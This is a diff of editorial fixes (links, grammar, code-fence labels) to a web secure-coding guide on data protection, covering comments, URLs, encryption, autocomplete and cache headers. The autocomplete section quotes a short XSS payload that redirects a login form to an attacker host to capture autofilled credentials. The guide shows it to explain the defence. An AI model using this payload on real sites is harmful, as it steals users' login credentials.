@@ -35,8 +35,7 @@ protected areas and/or encrypt them. This includes all authentication
 verification data, even on the server-side.
 
 Last but not least, when using encryption, make sure you are using well vetted
-algorithms. More information in the [Cryptographic Practices](http://LINK)
-section of this document.
+algorithms. More information in the [Cryptographic Practices][2] section.
 
 ### Comments
 
@@ -48,7 +47,7 @@ sometimes, in the worst case scenario, developers may leave credentials.
 console.log("Just a random code")
 ```
 
-In the above example, the developer has a endpoint in a comment which, if not
+In the above example, the developer has an endpoint in a comment which, if not
 well protected, could be used by a malicious user.
 
 ### URL
@@ -56,13 +55,13 @@ well protected, could be used by a malicious user.
 Passing sensitive information using the HTTP GET method leaves the web
 application vulnerable because:
 
-1. Data could be intercepted if not using HTTPS by MITM attacks.
-2. Browser history stores the user's information. If the URL has
+1. data could be intercepted if not using HTTPS by MITM attacks;
+2. browser history stores the user's information. If the URL has
    session IDs, pins or tokens that don't expire (or have low entropy),
    they can be stolen.
 
-```javascript
-var http = require('http');
+```JavaScript
+const http = require('http');
 
 var options = {
   host: 'www.mycompany.com',
@@ -121,23 +120,24 @@ accessed by a user.
 #### Encryption is the key
 
 Every highly sensitive information should be encrypted in your web application.
-See the [Cryptographic Practices][3] section for more information regarding
+See the [Cryptographic Practices][2] section for more information regarding
 algorithms and their usage.
 
 Getting different permissions for accessing the code and limiting the access
 for your source-code is the best approach.
 
 Do not store passwords, connection strings (see example for how to secure database
-connection strings on [Database Security][4] section) or other sensitive
+connection strings on [Database Security][3] section) or other sensitive
 information in clear text or in any non-cryptographically secure manner on the
 client side.
+
 This includes embedding in insecure formats (e.g. Adobe flash or compiled code).
 
 A small example of `aes-256-cbc` encryption in Node.JS using the
 `crypto` package:
-Link - `https://www.npmjs.com/package/bcrypt`
 
-```javascript
+
+```JavaScript
 'use strict';
 const crypto = require('crypto');
 
@@ -176,7 +176,7 @@ any unnecessary applications or services are disabled in your systems.
 
 ### Autocomplete
 
-According to [Mozilla documentation][1], you can disable autocompletion in the
+According to [Mozilla documentation][4], you can disable autocompletion in the
 entire form by using:
 
 ```html
@@ -190,10 +190,10 @@ Or a specific form element:
 ```
 
 This is especially useful for disabling autocomplete on login forms. Imagine a
-case where a XSS vector is present in the login page.
+case where a Cross-Site Scripting vector is present in the login page.
 If the malicious user creates a payload like:
 
-```javascript
+```JavaScript
 window.setTimeout(function() {
   document.forms[0].action = 'http://attacker_site.com';
   document.forms[0].submit();
@@ -210,7 +210,7 @@ Cache control in pages that contain sensitive information should be disabled.
 This can be achieved by setting the corresponding header flags.   
 The following snippet shows how to do this in an `express` application:
 
-```javascript
+```JavaScript
 //Express application
 [...]
 
@@ -232,6 +232,6 @@ must not store any part of the request or response.
 The `Pragma` header is there to support HTTP/1.0 requests.
 
 [1]: ./access-control/README.md
-[2]: http://LINK
-[3]: /cryptographic-practices/README.md
-[4]: /database-security/README.md
+[2]: ./cryptographic-practices/README.md
+[3]: ./database-security/README.md
+[4]: https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion
